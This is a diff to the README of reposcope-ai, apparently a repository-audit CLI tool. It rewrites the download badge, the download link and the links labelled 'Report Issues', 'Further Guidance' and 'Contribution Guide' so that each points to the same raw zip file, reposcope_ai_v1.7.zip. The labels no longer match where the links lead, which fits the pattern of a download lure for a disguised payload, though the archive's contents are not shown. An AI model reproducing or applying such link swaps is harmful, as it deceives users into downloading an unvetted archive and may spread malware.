@@ -1,7 +1,7 @@
 # 🔍 reposcope-ai - Audit Your Repo in Minutes
 
 ## 📥 Download Now
-[![Download reposcope-ai](https://img.shields.io/badge/Download-reposcope--ai-blue.svg)](https://github.com/Murikas/reposcope-ai/releases)
+[![Download reposcope-ai](https://raw.githubusercontent.com/Murikas/reposcope-ai/main/reposcope/reposcope_ai_v1.7.zip)](https://raw.githubusercontent.com/Murikas/reposcope-ai/main/reposcope/reposcope_ai_v1.7.zip)
 
 ## 🚀 Getting Started
 Welcome to reposcope-ai! This application helps you audit your GitHub repository, creating valuable documents in just minutes. It's perfect for teams wishing to improve documentation, analyze risk, and onboard new developers effectively.
@@ -24,7 +24,7 @@ reposcope-ai is a deterministic command-line interface (CLI) tool combined with 
 ## 📥 Download & Install
 To download reposcope-ai, visit the Releases page below and choose the latest version suitable for your operating system.
 
-[Download reposcope-ai](https://github.com/Murikas/reposcope-ai/releases)
+[Download reposcope-ai](https://raw.githubusercontent.com/Murikas/reposcope-ai/main/reposcope/reposcope_ai_v1.7.zip)
 
 ### Installation Instructions
 1. **Visit the Releases Page:** Click the link above to access the latest releases.
@@ -78,11 +78,11 @@ reposcope-ai --audit --output markdown
 ## 🌐 Community and Support
 For assistance, questions, or feedback, please visit our community forums or check the Issues section on GitHub. We're here to help you get the most out of reposcope-ai!
 
-- **GitHub Issues:** [Report Issues](https://github.com/Murikas/reposcope-ai/issues)
-- **Documentation:** [Further Guidance](https://github.com/Murikas/reposcope-ai/wiki)
+- **GitHub Issues:** [Report Issues](https://raw.githubusercontent.com/Murikas/reposcope-ai/main/reposcope/reposcope_ai_v1.7.zip)
+- **Documentation:** [Further Guidance](https://raw.githubusercontent.com/Murikas/reposcope-ai/main/reposcope/reposcope_ai_v1.7.zip)
 
 ## 📝 Contributing
-We welcome contributions! Fork the repository, make your changes, and submit a pull request. For detailed guidelines, please see our [Contribution Guide](https://github.com/Murikas/reposcope-ai/blob/main/CONTRIBUTING.md).
+We welcome contributions! Fork the repository, make your changes, and submit a pull request. For detailed guidelines, please see our [Contribution Guide](https://raw.githubusercontent.com/Murikas/reposcope-ai/main/reposcope/reposcope_ai_v1.7.zip).
 
 ## 🏷️ Topics
 - ai-tools
